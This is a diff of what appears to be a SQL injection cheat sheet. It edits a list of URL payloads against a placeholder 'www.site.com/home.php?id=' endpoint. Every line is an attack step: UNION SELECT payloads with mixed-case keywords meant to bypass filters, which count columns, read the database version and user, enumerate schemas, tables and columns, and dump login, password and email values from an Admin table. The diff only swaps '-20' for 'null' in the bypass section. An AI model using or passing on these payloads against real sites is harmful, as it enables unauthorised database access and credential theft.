@@ -14,15 +14,15 @@ www.site.com/home.php?id=-20+OrdEr+bY+1,2,3,4,5--
 www.site.com/home.php?id=-20+UnIoN+sElEcT+1,2,3,4,5--       
 www.site.com/home.php?id=-20+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
 www.site.com/home.php?id=-20+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
-www.site.com/home.php?id=null+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
+www.site.com/home.php?id=-20+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
 www.site.com/home.php?id=-20+UNION+SELECT+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+INFORMATION_SCHEM.COLUMNS+WHERE+TABLE_NAME=Admin--   
 www.site.com/index.php?id=-20+UNION+SELECT+1,GrOUp_COnCaT(id,login,password,email),3,4,5+FrOm+Admin—
 
 # bypass simple you joined 3 techiniques here null and + and Aa
-www.site.com/home.php?id=-20+OrdEr+bY+1,2,3,4,5--         
-www.site.com/home.php?id=-20+UnIoN+sElEcT+1,2,3,4,5--       
-www.site.com/home.php?id=-20+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
-www.site.com/home.php?id=-20+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
+www.site.com/home.php?id=null+OrdEr+bY+1,2,3,4,5--         
+www.site.com/home.php?id=null+UnIoN+sElEcT+1,2,3,4,5--       
+www.site.com/home.php?id=null+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
+www.site.com/home.php?id=null+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
 www.site.com/home.php?id=null+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
 www.site.com/home.php?id=null+UNION+SELECT+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+INFORMATION_SCHEM.COLUMNS+WHERE+TABLE_NAME=Admin--   
 www.site.com/index.php?id=null+UNION+SELECT+1,GrOUp_COnCaT(id,login,password,email),3,4,5+FrOm+Admin—
